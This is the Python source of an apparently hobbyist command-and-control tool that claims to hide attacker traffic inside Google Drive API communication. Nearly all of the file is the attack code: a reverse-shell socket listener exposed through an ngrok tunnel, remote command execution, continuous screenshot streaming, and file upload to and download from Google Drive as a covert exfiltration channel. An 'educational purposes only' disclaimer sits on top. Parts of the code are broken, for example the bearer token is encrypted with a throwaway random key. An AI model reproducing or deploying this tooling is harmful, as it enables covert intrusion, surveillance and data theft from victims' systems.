# This script integrates Google Drive API functionality to facilitate communication between the compromised system and the attacker-controlled server, thereby potentially hiding the traffic within legitimate Google Drive communication.

# This C2 is for simulation only and is still under development
# pip install -r requirements.txt
# python3 GoogleDrive-C2.py
# Author: S3N4T0R
# Date: 2024-6-4

# Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.


print('''\033[94m 
 #####                                     ######                                #####   #####  
#     #  ####   ####   ####  #      ###### #     # #####  # #    # ######       #     # #     # 
#       #    # #    # #    # #      #      #     # #    # # #    # #            #             # 
#  #### #    # #    # #      #      #####  #     # #    # # #    # #####  ##### #        #####  
#     # #    # #    # #  ### #      #      #     # #####  # #    # #            #       #       
#     # #    # #    # #    # #      #      #     # #   #  #  #  #  #            #     # #       
 #####   ####   ####   ####  ###### ###### ######  #    # #   ##   ######        #####  #######           
\033[0m''')

# Importing necessary libraries
import subprocess
import time
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import ARC4
import secrets


BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'


def generate_random_key(length):
    return secrets.token_bytes(length)


def get_attacker_info():
    attacker_ip = input("[+] Enter the IP for the reverse shell: ")
    return attacker_ip

# Function to encrypt access token using RC4
def encrypt_access_token(token, key_length):
    key = generate_random_key(key_length)
    # RC4 encryption
    cipher = ARC4.new(key)
    encrypted_token = cipher.encrypt(token.encode())
    return base64.b64encode(encrypted_token).decode()


def main():
    try:

        access_token = input("[+] Enter your Google Drive API access token: ")
        ip = get_attacker_info()
        port = input("[+] Enter the port number for the reverse shell and ngrok: ")
        key_length = int(input("[+] Enter the length of the RC4 key (in bytes): "))

        print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
        # Starting ngrok tunnel
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
        time.sleep(3)  

        # Encrypting access token
        access_token_encrypted = encrypt_access_token(access_token, key_length)

        # Defining headers for Google Drive API
        headers = {
            "Authorization": f"Bearer {access_token_encrypted}",
            "Content-Type": "application/json",
            "User-Agent": "GoogleDrive-API-Client/1.0",
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"
        }

        # Creating socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))  
        s.listen(1)
        print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
        client_socket, addr = s.accept()

        # Starting shell
        shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        # Starting display
        display = Display(visible=0, size=(800, 600))
        display.start()


        while True:
            command = input(RED + "Enter a command to execute (or type 'exit' to quit): " + RESET)
            if command.lower() == "exit":
                break
            
            time.sleep(random.uniform(1, 5))
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            stderr = result.stderr
            
            client_socket.send(command.encode())
            client_socket.send(stdout.encode())
            client_socket.send(stderr.encode())

            if command.lower() == "screen":
                screen = pyautogui.screenshot()
                screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                client_socket.send(screen_data.encode())

                while True:
                    try:
                        screen = pyautogui.screenshot()
                        screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                        client_socket.send(screen_data.encode())

                        time.sleep(0.1)
                    except KeyboardInterrupt:
                        print("\nScreen session ended.")
                        break

            elif command.lower() == "upload":
                file_path = input("Enter the path of the file to upload: ")
                file_name = os.path.basename(file_path)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                url = "https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
                response = requests.post(url, headers=headers, data=file_data)
                client_socket.send(response.text.encode())

            elif command.lower() == "download":
                file_path = input("Enter the path of the file to download: ")
                url = f"https://www.googleapis.com/drive/v3/files/{file_path}?alt=media"
                response = requests.get(url, headers=headers)
                with open(os.path.basename(file_path), "wb") as f:
                    f.write(response.content)
                client_socket.send("File downloaded successfully.".encode())

            elif command.lower() == "list_files":
                url = "https://www.googleapis.com/drive/v3/files"
                response = requests.get(url, headers=headers)
                client_socket.send(response.text.encode())

            else:
                client_socket.send(stdout.encode())
                client_socket.send(stderr.encode())


        client_socket.close()
        s.close()
        display.stop()


        ngrok_process.terminate()

    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

if __name__ == "__main__":
    main()

